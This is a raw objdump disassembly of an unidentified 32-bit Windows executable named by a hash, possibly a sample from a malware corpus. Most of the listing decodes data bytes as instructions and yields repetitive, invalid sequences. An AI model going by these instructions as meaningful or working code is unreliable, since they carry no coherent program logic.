
2c5c6577408a84804e5cbd02cfc25a38fbecf3f8ba87a66ed93dd0af9f6f5edd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	int3   
  401001:	and    eax,0x25d00042
  401006:	inc    edx
  401007:	add    al,bh
  401009:	and    eax,0x26000042
  40100e:	inc    edx
  40100f:	add    BYTE PTR [esi+eiz*1],al
  401012:	inc    edx
  401013:	add    al,bl
  401015:	and    eax,0x25dc0042
  40101a:	inc    edx
  40101b:	add    al,ah
  40101d:	and    eax,0x25e40042
  401022:	inc    edx
  401023:	add    al,ch
  401025:	and    eax,0x25ec0042
  40102a:	inc    edx
  40102b:	add    al,dh
  40102d:	and    eax,0x23740042
  401032:	inc    edx
  401033:	add    BYTE PTR [eax+0x23],bh
  401036:	inc    edx
  401037:	add    BYTE PTR [ebx+eiz*1+0x42],bh
  40103b:	add    BYTE PTR [eax-0x7bffbddd],al
  401041:	and    eax,DWORD PTR [edx+0x0]
  401044:	mov    BYTE PTR [ebx],ah
  401046:	inc    edx
  401047:	add    BYTE PTR [ebx+eiz*1+0x23900042],cl
  40104e:	inc    edx
  40104f:	add    BYTE PTR [ebx+eiz*1+0x23980042],dl
  401056:	inc    edx
  401057:	add    BYTE PTR [ebx+eiz*1+0x23a00042],bl
  40105e:	inc    edx
  40105f:	add    BYTE PTR [ebx+eiz*1+0x23a80042],ah
  401066:	inc    edx
  401067:	add    BYTE PTR [ebx+eiz*1+0x23b00042],ch
  40106e:	inc    edx
  40106f:	add    BYTE PTR [ebx+eiz*1+0x23b80042],dh
  401076:	inc    edx
  401077:	add    BYTE PTR [ebx+eiz*1+0x23c00042],bh
  40107e:	inc    edx
  40107f:	add    ah,al
  401081:	and    eax,DWORD PTR [edx+0x0]
  401084:	enter  0x4223,0x0
  401088:	int3   
  401089:	and    eax,DWORD PTR [edx+0x0]
  40108c:	shl    BYTE PTR [ebx],1
  40108e:	inc    edx
  40108f:	add    ah,dl
  401091:	and    eax,DWORD PTR [edx+0x0]
  401094:	fsub   DWORD PTR [ebx]
  401096:	inc    edx
  401097:	add    ah,bl
  401099:	and    eax,DWORD PTR [edx+0x0]
  40109c:	loopne 0x4010c1
  40109e:	inc    edx
  40109f:	add    ah,ah
  4010a1:	and    eax,DWORD PTR [edx+0x0]
  4010a4:	call   0xec4052cc
  4010a9:	and    eax,DWORD PTR [edx+0x0]
  4010ac:	lock and eax,DWORD PTR [edx+0x0]
  4010b0:	hlt    
  4010b1:	and    eax,DWORD PTR [edx+0x0]
  4010b4:	clc    
  4010b5:	and    eax,DWORD PTR [edx+0x0]
  4010b8:	cld    
  4010b9:	and    eax,DWORD PTR [edx+0x0]
  4010bc:	add    BYTE PTR [edx+eax*2],ah
  4010bf:	add    BYTE PTR [esp],al
  4010c2:	inc    edx
  4010c3:	add    BYTE PTR [eax],cl
  4010c5:	and    al,0x42
  4010c7:	add    BYTE PTR [esp],cl
  4010ca:	inc    edx
  4010cb:	add    BYTE PTR [eax],dl
  4010cd:	and    al,0x42
  4010cf:	add    BYTE PTR [esp],dl
  4010d2:	inc    edx
  4010d3:	add    BYTE PTR [eax],bl
  4010d5:	and    al,0x42
  4010d7:	add    BYTE PTR [esp],bl
  4010da:	inc    edx
  4010db:	add    BYTE PTR [eax],ah
  4010dd:	and    al,0x42
  4010df:	add    BYTE PTR [esp],ah
  4010e2:	inc    edx
  4010e3:	add    BYTE PTR [eax],ch
  4010e5:	and    al,0x42
  4010e7:	add    BYTE PTR [esp],ch
  4010ea:	inc    edx
  4010eb:	add    BYTE PTR [eax],dh
  4010ed:	and    al,0x42
  4010ef:	add    BYTE PTR [esp],dh
  4010f2:	inc    edx
  4010f3:	add    BYTE PTR [eax],bh
  4010f5:	and    al,0x42
  4010f7:	add    BYTE PTR [esp],bh
  4010fa:	inc    edx
  4010fb:	add    BYTE PTR [eax+0x24],al
  4010fe:	inc    edx
  4010ff:	add    BYTE PTR [esp+0x42],al
  401103:	add    BYTE PTR [eax+0x24],cl
  401106:	inc    edx
  401107:	add    BYTE PTR [esp+0x42],cl
  40110b:	add    BYTE PTR [eax+0x24],dl
  40110e:	inc    edx
  40110f:	add    BYTE PTR [esp+0x42],dl
  401113:	add    BYTE PTR [eax+0x24],bl
  401116:	inc    edx
  401117:	add    BYTE PTR [esp+0x42],bl
  40111b:	add    BYTE PTR [eax+0x24],ah
  40111e:	inc    edx
  40111f:	add    BYTE PTR [eax-0x4bffbddb],dh
  401125:	and    eax,0x25b80042
  40112a:	inc    edx
  40112b:	add    BYTE PTR [ebp+eiz*1+0x25c00042],bh
  401132:	inc    edx
  401133:	add    ah,al
  401135:	and    eax,0x24740042
  40113a:	inc    edx
  40113b:	add    BYTE PTR [eax+0x24],bh
  40113e:	inc    edx
  40113f:	add    BYTE PTR [esp+0x42],bh
  401143:	add    BYTE PTR [eax-0x7bffbddc],al
  401149:	and    al,0x42
  40114b:	add    BYTE PTR [eax-0x73ffbddc],cl
  401151:	and    al,0x42
  401153:	add    BYTE PTR [eax-0x6bffbddc],dl
  401159:	and    al,0x42
  40115b:	add    BYTE PTR [eax-0x63ffbddc],bl
  401161:	and    al,0x42
  401163:	add    BYTE PTR [eax-0x5bffbddc],ah
  401169:	and    al,0x42
  40116b:	add    BYTE PTR [eax-0x53ffbddc],ch
  401171:	and    al,0x42
  401173:	add    BYTE PTR [eax-0x4bffbddc],dh
  401179:	and    al,0x42
  40117b:	add    BYTE PTR [eax-0x43ffbddc],bh
  401181:	and    al,0x42
  401183:	add    al,al
  401185:	and    al,0x42
  401187:	add    ah,al
  401189:	and    al,0x42
  40118b:	add    al,cl
  40118d:	and    al,0x42
  40118f:	add    ah,cl
  401191:	and    al,0x42
  401193:	add    al,dl
  401195:	and    al,0x42
  401197:	add    ah,dl
  401199:	and    al,0x42
  40119b:	add    al,bl
  40119d:	and    al,0x42
  40119f:	add    ah,bl
  4011a1:	and    al,0x42
  4011a3:	add    al,ah
  4011a5:	and    al,0x42
  4011a7:	add    ah,ah
  4011a9:	and    al,0x42
  4011ab:	add    al,ch
  4011ad:	and    al,0x42
  4011af:	add    ah,ch
  4011b1:	and    al,0x42
  4011b3:	add    al,dh
  4011b5:	and    al,0x42
  4011b7:	add    ah,dh
  4011b9:	and    al,0x42
  4011bb:	add    al,bh
  4011bd:	and    al,0x42
  4011bf:	add    ah,bh
  4011c1:	and    al,0x42
  4011c3:	add    BYTE PTR [eax],al
  4011c5:	and    eax,0x25040042
  4011ca:	inc    edx
  4011cb:	add    BYTE PTR [eax],cl
  4011cd:	and    eax,0x250c0042
  4011d2:	inc    edx
  4011d3:	add    BYTE PTR [eax],dl
  4011d5:	and    eax,0x25140042
  4011da:	inc    edx
  4011db:	add    BYTE PTR [eax],bl
  4011dd:	and    eax,0x251c0042
  4011e2:	inc    edx
  4011e3:	add    BYTE PTR [eax],ah
  4011e5:	and    eax,0x25240042
  4011ea:	inc    edx
  4011eb:	add    BYTE PTR [eax],ch
  4011ed:	and    eax,0x252c0042
  4011f2:	inc    edx
  4011f3:	add    BYTE PTR [eax],dh
  4011f5:	and    eax,0x25340042
  4011fa:	inc    edx
  4011fb:	add    BYTE PTR [eax],bh
  4011fd:	and    eax,0x253c0042
  401202:	inc    edx
  401203:	add    BYTE PTR [eax+0x25],al
  401206:	inc    edx
  401207:	add    BYTE PTR [ebp+eiz*1+0x42],al
  40120b:	add    BYTE PTR [eax+0x25],cl
  40120e:	inc    edx
  40120f:	add    BYTE PTR [ebp+eiz*1+0x42],cl
  401213:	add    BYTE PTR [eax+0x25],dl
  401216:	inc    edx
  401217:	add    BYTE PTR [ebp+eiz*1+0x42],dl
  40121b:	add    BYTE PTR [eax+0x25],bl
  40121e:	inc    edx
  40121f:	add    BYTE PTR [ebp+eiz*1+0x42],bl
  401223:	add    BYTE PTR [eax+0x25],ah
  401226:	inc    edx
  401227:	add    BYTE PTR [ebp+eiz*1+0x42],ah
  40122b:	add    BYTE PTR [eax+0x25],ch
  40122e:	inc    edx
  40122f:	add    BYTE PTR [ebp+eiz*1+0x42],ch
  401233:	add    BYTE PTR [eax+0x25],dh
  401236:	inc    edx
  401237:	add    BYTE PTR [ebp+eiz*1+0x42],dh
  40123b:	add    BYTE PTR [eax+0x25],bh
  40123e:	inc    edx
  40123f:	add    BYTE PTR [ebp+eiz*1+0x42],bh
  401243:	add    BYTE PTR [eax-0x7bffbddb],al
  401249:	and    eax,0x25880042
  40124e:	inc    edx
  40124f:	add    BYTE PTR [ebp+eiz*1+0x25900042],cl
  401256:	inc    edx
  401257:	add    BYTE PTR [ebp+eiz*1+0x25980042],dl
  40125e:	inc    edx
  40125f:	add    BYTE PTR [ebp+eiz*1+0x25a00042],bl
  401266:	inc    edx
  401267:	add    BYTE PTR [ebp+eiz*1+0x25a80042],ah
  40126e:	inc    edx
  40126f:	add    BYTE PTR [eax],al
  401271:	add    al,BYTE PTR [eax]
  401273:	add    BYTE PTR [esp+edx*4-0x6b7bfff8],cl
  40127a:	or     BYTE PTR [eax],al
  40127c:	adc    BYTE PTR [esi-0x59ffcd68],ah
  401282:	nop
  401283:	xor    dh,al
  401285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401286:	test   al,0x32
  401288:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40128a:	mov    al,ds:0x9f48c32
  40128f:	add    BYTE PTR [eax-0x6c],ch
  401292:	or     BYTE PTR [eax],al
  401294:	lahf   
  401295:	test   eax,0xa90c3d73
  40129a:	cmp    BYTE PTR ds:0x3d90a913,0xfa
  4012a1:	test   al,0xcb
  4012a3:	cmp    eax,0x3dd0a942
  4012a8:	add    BYTE PTR [ecx-0x5538c1eb],ch
  4012ae:	dec    ecx
  4012af:	ds inc ebp
  4012b1:	stos   BYTE PTR es:[edi],al
  4012b2:	lds    edi,FWORD PTR [esi]
  4012b4:	fsubr  DWORD PTR [edx-0x1b73fff8]
  4012ba:	or     DWORD PTR [eax],eax
  4012bc:	sbb    BYTE PTR [eax+ecx*1-0x4a5bdd00],dl
  4012c3:	xor    cl,cl
  4012c5:	mov    ds:0xa3c930fc,eax
  4012ca:	pop    ds
  4012cb:	xor    DWORD PTR [ebp+0x231ffa4],edi
  4012d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012d2:	mov    bl,0x32
  4012d4:	shl    DWORD PTR [ebp+0x32de],0x0
	...
  4012eb:	add    BYTE PTR [ebp+eiz*4-0x5887cd0b],ch
  4012f2:	adc    dh,BYTE PTR [ebx]
  4012f4:	pop    esi
  4012f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f6:	pop    ebp
  4012f7:	xor    ecx,DWORD PTR ds:0x1b3381a7
  4012fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012fe:	sahf   
  4012ff:	xor    esi,DWORD PTR [eax]
  401301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401302:	mov    ebp,0xcba63733
  401307:	xor    eax,DWORD PTR [esi-0x5a]
  40130a:	fnstenv [ebx]
  40130c:	dec    ebx
  40130d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40130e:	out    0x33,eax
  401310:	pop    ecx
  401311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401312:	sysenter 
  401314:	jge    0x4012b6
  401316:	adc    esi,DWORD PTR [eiz*4-0x32cbc460]
  40131d:	mov    al,ds:0xa0c23470
  401322:	mov    WORD PTR [ecx+eiz*1],?
  401325:	mov    eax,ds:0xa0fe3492
  40132a:	out    0x34,al
  40132c:	and    al,0xa1
  40132e:	or     eax,0x139f7d35
  401333:	xor    eax,0x35269f70
  401338:	push   ebp
  401339:	lahf   
  40133a:	ss xor eax,0x35459f50
  401340:	arpl   WORD PTR [edi-0x6099ca94],bx
  401346:	addr16 xor eax,0x35719f79
  40134c:	push   0xffffff9f
  40134e:	mov    WORD PTR ds:0x0,?
	...
  401364:	(bad)  
  401365:	lahf   
  401366:	nop
  401367:	xor    eax,0x35aa9ff9
  40136c:	adc    esp,DWORD PTR [eax-0x603dca3e]
  401372:	hlt    
  401373:	xor    eax,0x3604a28e
  401378:	and    BYTE PTR [edx-0x5ddbc9ad],0x74
  40137f:	adc    ah,BYTE PTR ss:[ebx-0x5cfac965]
  401386:	test   eax,0xbca2e536
  40138b:	les    esp,FWORD PTR ss:[edx-0x5d9ac927]
  401392:	loopne 0x4013ca
  401394:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40139b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013a2:	or     BYTE PTR [eax],al
  4013a4:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013ab:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013b2:	or     BYTE PTR [eax],al
  4013b4:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013bb:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013c2:	or     BYTE PTR [eax],al
  4013c4:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  4013db:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013e2:	or     BYTE PTR [eax],al
  4013e4:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013eb:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013f2:	or     BYTE PTR [eax],al
  4013f4:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013fb:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401402:	or     BYTE PTR [eax],al
  401404:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40140b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401412:	or     BYTE PTR [eax],al
  401414:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40141b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401422:	or     BYTE PTR [eax],al
  401424:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40142b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401432:	or     BYTE PTR [eax],al
  401434:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40143b:	add    BYTE PTR [esp+edx*4+0x8],cl
	...
  401452:	add    BYTE PTR [eax],al
  401454:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40145b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401462:	or     BYTE PTR [eax],al
  401464:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40146b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401472:	or     BYTE PTR [eax],al
  401474:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40147b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401482:	or     BYTE PTR [eax],al
  401484:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40148b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  401492:	or     BYTE PTR [eax],al
  401494:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  40149b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4014a2:	or     BYTE PTR [eax],al
  4014a4:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4014ab:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4014b2:	or     BYTE PTR [eax],al
  4014b4:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  4014cb:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4014d2:	or     BYTE PTR [eax],al
  4014d4:	mov    WORD PTR [eax+ecx*1+0x1760000],ss
  4014db:	add    BYTE PTR [esp+ebp*8-0xe2cffb7],cl
  4014e2:	jl     0x401534
  4014e4:	fdivp  st(3),st
  4014e6:	imul   eax,DWORD PTR [ecx-0x10],0xfffffff0
  4014ea:	jp     0x401551
  4014ec:	(bad)  
  4014ee:	or     BYTE PTR [eax],al
  4014f0:	fdivr  st,st(3)
  4014f2:	imul   esp,DWORD PTR [eax+edx*8-0x3],0xe6ad726a
  4014fa:	jno    0x401541
  4014fc:	mov    ah,0xd5
  4014fe:	or     BYTE PTR [eax],al
  401500:	fdivr  st,st(3)
  401502:	imul   esp,DWORD PTR [eax+edx*8-0x3],0xe6ad726a
  40150a:	jno    0x401551
  40150c:	xchg   esp,eax
  40150d:	ret    
  40150e:	or     BYTE PTR [eax],al
  401510:	push   ebx
  401511:	icebp  
  401512:	jl     0x401561
  401514:	jae    0x401506
  401516:	jge    0x401584
  401518:	jno    0x4014f6
  40151a:	imul   ebp,DWORD PTR [esi+0x68],0x8c416df8
  401521:	xchg   esp,eax
  401522:	or     BYTE PTR [eax],al
  401524:	dec    edi
  401525:	out    0x6d,al
  401527:	popa   
  401528:	pusha  
  401529:	icebp  
  40152a:	dec    esi
  40152b:	imul   esp,DWORD PTR [eax-0xf],0xe7380049
  401532:	jl     0x4015a6
  401534:	das    
  401535:	cmc    
  401536:	jl     0x401579
  401538:	mov    WORD PTR [eax+ecx*1+0x7cf14b00],ss
  40153f:	push   edi
	...
  401554:	xor    eax,0x1b6f6cfa
  401559:	out    0x4c,eax
  40155b:	imul   ebx,DWORD PTR [esi],0x23746bf1
  401561:	out    0x71,al
  401563:	inc    ecx
  401564:	mov    WORD PTR [eax+ecx*1+0x7cefcb00],ss
  40156b:	dec    ebp
  40156c:	jmp    0x40155e
  40156e:	jge    0x4015dc
  401570:	jmp    0xf0ae7f51
  401575:	clc    
  401576:	ins    DWORD PTR es:[edi],dx
  401577:	push   edi
  401578:	mov    WORD PTR [eax+ecx*1+0x48969000],ss
  40157f:	add    BYTE PTR [eax-0x6a],bh
  401582:	dec    eax
  401583:	add    BYTE PTR [eax-0x6a],dh
  401586:	dec    eax
  401587:	add    BYTE PTR [eax-0x6a],bh
  40158a:	dec    eax
  40158b:	add    ah,al
  40158d:	xchg   esi,eax
  40158e:	dec    eax
  40158f:	add    al,bl
  401591:	xchg   esi,eax
  401592:	dec    eax
  401593:	add    BYTE PTR [esi+edx*4-0x695bffb8],ch
  40159a:	dec    eax
  40159b:	add    bl,dl
  40159d:	out    dx,eax
  40159e:	jl     0x4015f0
  4015a0:	sahf   
  4015a1:	stc    
  4015a2:	imul   eax,DWORD PTR [ecx+0x70],0xfffffff0
  4015a6:	jp     0x40160d
  4015a8:	jg     0x40158f
  4015aa:	or     BYTE PTR [eax],al
  4015ac:	dec    eax
  4015ad:	stc    
  4015ae:	imul   esp,DWORD PTR [eax+eax*2-0x5],0xe66d726a
  4015b6:	jno    0x4015fd
	...
  4015cc:	ror    DWORD PTR fs:[eax],cl
  4015cf:	add    BYTE PTR [edi-0x11],ah
  4015d2:	jp     0x401642
  4015d4:	imul   edi,eax,0xf07a323b
  4015da:	fs ins BYTE PTR es:[edi],dx
  4015dc:	mov    WORD PTR [eax+ecx*1+0x7ee52900],ss
  4015e3:	arpl   WORD PTR [esi],di
  4015e5:	loopne 0x40160d
  4015e7:	fs cmp al,bh
  4015ea:	or     BYTE PTR [eax],al
  4015ec:	xor    edi,ebp
  4015ee:	gs jae 0x401622
  4015f1:	loopne 0x4015fb
  4015f3:	add    BYTE PTR [ecx],ah
  4015f5:	in     eax,0x7e
  4015f7:	arpl   si,di
  4015f9:	loopne 0x401621
  4015fb:	fs lock clc 
  4015fe:	or     BYTE PTR [eax],al
  401600:	jmp    0xfca37bf4
  401605:	jmp    0x40160f
  401607:	add    dl,al
  401609:	sti    
  40160a:	jp     0x401680
  40160c:	fpatan 
  40160e:	fs inc ecx
  401610:	call   0x8ca37e0d
  401615:	xchg   esp,eax
  401616:	or     BYTE PTR [eax],al
  401618:	loope  0x401614
  40161a:	gs popa 
  40161c:	mov    esp,0xc36561c2
  401621:	fldcw  WORD PTR [esi+0x46]
  401624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401625:	clc    
  401626:	ins    DWORD PTR es:[edi],dx
  401627:	add    dl,al
  401629:	sti    
  40162a:	jp     0x4016a0
  40162c:	cdq    
  40162d:	repz fs push eax
	...
  401644:	sahf   
  401645:	stc    
  401646:	jl     0x4016ad
  401648:	scas   eax,DWORD PTR es:[edi]
  401649:	loopne 0x401653
  40164b:	add    BYTE PTR [edi+ebp*8+0x69],dl
  40164f:	jo     0x40169e
  401651:	clc    
  401652:	outs   dx,DWORD PTR fs:[esi]
  401654:	outs   dx,DWORD PTR ds:[esi]
  401655:	xchg   esp,eax
  401656:	or     BYTE PTR [eax],al
  401658:	addr16 out dx,eax
  40165a:	jp     0x4016ca
  40165c:	jno    0x401656
  40165e:	cmp    esi,DWORD PTR [edx]
  401660:	mov    dl,0xf0
  401662:	fs ins BYTE PTR es:[edi],dx
  401664:	mov    WORD PTR [eax+ecx*1+0x7cef4b00],ss
  40166b:	push   eax
  40166c:	ds stc 
  40166e:	imul   esp,DWORD PTR [ebp+0x3f],0xffffffe5
  401672:	inc    eax
  401673:	gs sub eax,0x8c0008e4
  401679:	xchg   esp,eax
  40167a:	outs   dx,BYTE PTR ds:[esi]
  40167b:	add    DWORD PTR [eax+esi*1+0x7e8c9051],ecx
  401682:	or     eax,DWORD PTR [eax]
  401684:	mov    WORD PTR [edi+0xb],?
  401687:	add    BYTE PTR [edx+ebp*2-0x5a73ff0d],cl
  40168e:	or     eax,DWORD PTR [eax]
  401690:	mov    WORD PTR [ebp+0xb],?
  401693:	add    BYTE PTR [ebp+edi*4+0x7d8c000c],cl
  40169a:	or     eax,DWORD PTR [eax]
  40169c:	mov    WORD PTR [ebp+0xb],?
  40169f:	add    BYTE PTR [ebp+edi*2+0x7d8c000b],cl
  4016a6:	or     eax,DWORD PTR [eax]
	...
  4016bc:	mov    WORD PTR [ebp+0xb],?
  4016bf:	add    BYTE PTR [ebp+edi*2+0x7d8c000b],cl
  4016c6:	or     eax,DWORD PTR [eax]
  4016c8:	mov    WORD PTR [ebp+0xb],?
  4016cb:	add    BYTE PTR [ebp+edi*8+0x6f8c000c],cl
  4016d2:	adc    bh,BYTE PTR [edx+0x9a77d92]
  4016d8:	dec    ecx
  4016d9:	pop    ebp
  4016da:	mov    bl,0x1
  4016dc:	sar    BYTE PTR [eax],0x2d
  4016df:	push   esp
  4016e0:	je     0x401676
  4016e2:	jg     0x401704
  4016e4:	jl     0x401751
  4016e6:	bound  esp,QWORD PTR [edi+0x7e]
  4016e9:	pop    esp
  4016ea:	pusha  
  4016eb:	and    BYTE PTR [edi+0x5c],ch
  4016ee:	popa   
  4016ef:	outs   dx,BYTE PTR ds:[esi]
  4016f0:	jnp    0x40173b
  4016f2:	sub    esp,DWORD PTR [edx+0x69]
  4016f5:	popf   
  4016f6:	jle    0x40176d
  4016f8:	push   0xffffff9d
  4016fa:	outs   dx,BYTE PTR gs:[esi]
  4016fc:	lods   al,BYTE PTR ds:[esi]
  4016fd:	xor    DWORD PTR [edx+0x53],eax
  401700:	ins    BYTE PTR es:[edi],dx
  401701:	push   eax
  401702:	bound  esp,QWORD PTR [ecx+ebp*1+0x67]
  401706:	add    BYTE PTR ds:0x3c59486,cl
  40170c:	mov    WORD PTR [ecx+eiz*8-0x4e6b73fd],ss
  401713:	inc    eax
  401714:	mov    WORD PTR [ebp+edx*4-0x296b70fc],ss
  40171b:	dec    ebx
  40171c:	test   ah,0xe1
  40171f:	add    eax,DWORD PTR [eax]
	...
  401731:	add    BYTE PTR [eax],al
  401733:	add    BYTE PTR [esp+edx*4-0x6b73fc1f],cl
  40173a:	add    DWORD PTR [ebx+ecx*4],eax
  40173d:	xchg   ebp,eax
  40173e:	cli    
  40173f:	add    al,0x8e
  401741:	mov    ds:0x948d1be1,al
  401746:	loope  0x40179d
  401748:	mov    WORD PTR [ecx+eiz*8+0x18948c03],ss
  40174f:	pop    es
  401750:	lea    edx,[ecx+eiz*8-0x1e6b73ed]
  401757:	xor    ecx,DWORD PTR [ebp-0x33fc1e6c]
  40175d:	xchg   esp,eax
  40175e:	loope  0x401773
  401760:	mov    WORD PTR [ecx+eiz*8-0x1a6b73fb],ss
  401767:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc1f]
  40176e:	in     eax,0x3
  401770:	mov    WORD PTR [ecx+eiz*8-0x1e6b73fd],ss
  401777:	xchg   ebx,eax
  401778:	lea    edx,[ecx+eiz*8-0x416b73fb]
  40177f:	mov    ecx,0x3e3948d
  401784:	mov    WORD PTR [ecx+eiz*8-0x1e6b83fd],ss
  40178b:	adc    ecx,DWORD PTR [esp+edx*4-0x6b83fc1f]
  401792:	loope  0x4017a7
  401794:	mov    WORD PTR [eax+ecx*1+0xe9],ss
	...
  4017ab:	add    BYTE PTR [edi-0x7026f76c],cl
  4017b1:	xchg   esp,eax
  4017b2:	or     cl,ch
  4017b4:	(bad)  
  4017b5:	xchg   esp,eax
  4017b6:	or     cl,ch
  4017b8:	(bad)  
  4017b9:	xchg   esp,eax
  4017ba:	or     BYTE PTR ds:0x21089525,bl
  4017c0:	(bad)  
  4017c1:	xchg   esp,eax
  4017c2:	or     cl,ch
  4017c4:	(bad)  
  4017c5:	xchg   esp,eax
  4017c6:	or     cl,ch
  4017c8:	(bad)  
  4017c9:	xchg   esp,eax
  4017ca:	or     cl,ch
  4017cc:	(bad)  
  4017cd:	xchg   esp,eax
  4017ce:	or     cl,ch
  4017d0:	(bad)  
  4017d1:	xchg   esp,eax
  4017d2:	or     cl,ch
  4017d4:	(bad)  
  4017d5:	xchg   esp,eax
  4017d6:	or     cl,ch
  4017d8:	(bad)  
  4017d9:	xchg   esp,eax
  4017da:	or     cl,ch
  4017dc:	(bad)  
  4017dd:	xchg   esp,eax
  4017de:	or     cl,ch
  4017e0:	(bad)  
  4017e1:	xchg   esp,eax
  4017e2:	or     cl,ch
  4017e4:	(bad)  
  4017e5:	xchg   esp,eax
  4017e6:	or     cl,ch
  4017e8:	(bad)  
  4017e9:	xchg   esp,eax
  4017ea:	or     cl,ch
  4017ec:	(bad)  
  4017ed:	xchg   esp,eax
  4017ee:	or     cl,ch
  4017f0:	(bad)  
  4017f1:	xchg   esp,eax
  4017f2:	or     cl,ch
  4017f4:	(bad)  
  4017f5:	xchg   esp,eax
  4017f6:	or     cl,ch
  4017f8:	(bad)  
  4017f9:	xchg   esp,eax
  4017fa:	or     cl,ch
  4017fc:	(bad)  
  4017fd:	xchg   esp,eax
  4017fe:	or     cl,ch
  401800:	(bad)  
  401801:	xchg   esp,eax
  401802:	or     cl,ch
  401804:	(bad)  
  401805:	xchg   esp,eax
  401806:	or     cl,ch
  401808:	(bad)  
  401809:	xchg   esp,eax
  40180a:	or     cl,ch
  40180c:	(bad)  
  40180d:	xchg   esp,eax
  40180e:	or     cl,ch
	...
  401824:	(bad)  
  401825:	xchg   esp,eax
  401826:	or     BYTE PTR [ebp+0x7908940e],dh
  40182c:	(bad)  
  40182d:	xchg   esp,eax
  40182e:	or     cl,ch
  401830:	(bad)  
  401831:	xchg   esp,eax
  401832:	or     cl,ch
  401834:	(bad)  
  401835:	xchg   esp,eax
  401836:	or     BYTE PTR [eax],al
  401838:	in     eax,0x91
  40183a:	or     BYTE PTR [eax],al
  40183c:	mov    ch,0x91
  40183e:	or     BYTE PTR [eax],al
  401840:	mov    ch,0x91
  401842:	or     BYTE PTR [eax],al
  401844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401845:	xchg   ecx,eax
  401846:	or     BYTE PTR [eax],al
  401848:	fcomi  st,st(5)
  40184a:	ins    DWORD PTR es:[edi],dx
  40184b:	js     0x40184e
  40184d:	xchg   edx,eax
  40184e:	or     BYTE PTR [eax],al
  401850:	out    dx,al
  401851:	test   BYTE PTR [ecx],cl
  401853:	add    BYTE PTR [ebp-0x5afff77f],ah
  401859:	mov    DWORD PTR [ecx],ecx
  40185b:	add    BYTE PTR [ebp-0x71],dh
  40185e:	or     BYTE PTR [eax],al
  401860:	jne    0x4017f3
  401862:	or     BYTE PTR [eax],al
  401864:	gs xchg ecx,eax
  401866:	or     BYTE PTR [eax],al
  401868:	gs xchg ecx,eax
  40186a:	or     BYTE PTR [eax],al
  40186c:	xchg   ebp,eax
  40186d:	nop
  40186e:	or     BYTE PTR [eax-0x75],ah
  401871:	fisubr WORD PTR [ecx+eiz*2-0x3f]
  401875:	icebp  
  401876:	or     BYTE PTR [eax],al
  401878:	gs xchg edx,eax
  40187a:	or     BYTE PTR [eax],al
  40187c:	xor    eax,0x350009a1
  401881:	(bad)
  401885:	xchg   DWORD PTR [ecx],ecx
	...
  40189b:	add    BYTE PTR ds:0x35000891,ah
  4018a1:	xchg   ecx,eax
  4018a2:	or     BYTE PTR [eax],al
  4018a4:	xor    eax,0x65000891
  4018a9:	nop
  4018aa:	or     BYTE PTR [eax+0x3b],al
  4018ad:	lds    ebp,FWORD PTR [ecx+0x74]
  4018b0:	xchg   esp,eax
  4018b1:	nop
  4018b2:	or     BYTE PTR [eax],al
  4018b4:	dec    ebp
  4018b5:	fisttp DWORD PTR [eax]
  4018b7:	add    ch,ah
  4018b9:	ror    BYTE PTR [ecx],1
  4018bb:	add    ch,ah
  4018bd:	(bad)  
  4018be:	or     BYTE PTR [eax],al
  4018c0:	cmc    
  4018c1:	jl     0x4018cc
  4018c3:	add    BYTE PTR [ebx+edi*2+0x7b8c000b],cl
  4018ca:	or     eax,DWORD PTR [eax]
  4018cc:	mov    WORD PTR [ebx+0xb],?
  4018cf:	add    BYTE PTR [ebx+edi*1+0x7acc000b],cl
  4018d6:	or     eax,DWORD PTR [eax]
  4018d8:	mov    WORD PTR [ebx+0xb],?
  4018db:	add    BYTE PTR [ebx+edi*2+0x7b8c000b],cl
  4018e2:	or     eax,DWORD PTR [eax]
  4018e4:	mov    WORD PTR [eax],gs
  4018e6:	test   ah,ch
